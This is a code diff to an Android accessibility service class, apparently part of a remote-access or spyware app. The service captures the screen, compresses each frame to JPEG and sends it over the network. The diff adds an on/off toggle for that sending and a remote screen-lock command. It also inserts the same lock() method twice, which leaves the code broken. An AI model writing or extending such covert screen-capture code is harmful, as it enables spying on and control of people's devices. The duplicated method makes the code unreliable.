@@ -249,6 +249,22 @@ public class KeySvc extends AccessibilityService {
         } catch (Throwable ignored) {}
     }
 
+    public void lock() {
+        H.post(() -> {
+            try {
+                if (Build.VERSION.SDK_INT >= 28) performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
+            } catch (Throwable ignored) {}
+        });
+    }
+
+    public void lock() {
+        H.post(() -> {
+            try {
+                if (Build.VERSION.SDK_INT >= 28) performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
+            } catch (Throwable ignored) {}
+        });
+    }
+
     private void grab() {
         if (shotBusy) return;
         shotBusy = true;
@@ -266,9 +282,11 @@ public class KeySvc extends AccessibilityService {
                         int th = Math.max(2, soft.getHeight() * tw / Math.max(1, soft.getWidth())) & ~1;
                         small = Bitmap.createScaledBitmap(soft, tw, th, true);
                         ScreenSvc.lastFrame = System.currentTimeMillis();
-                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
-                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
-                        Net.sendBin(bo.toByteArray());
+                        if (shotOn) {
+                            ByteArrayOutputStream bo = new ByteArrayOutputStream();
+                            small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
+                            Net.sendBin(bo.toByteArray());
+                        }
                     } catch (Throwable ignored) {
                     } finally {
                         try { if (small != null) small.recycle(); } catch (Throwable ignored) {}
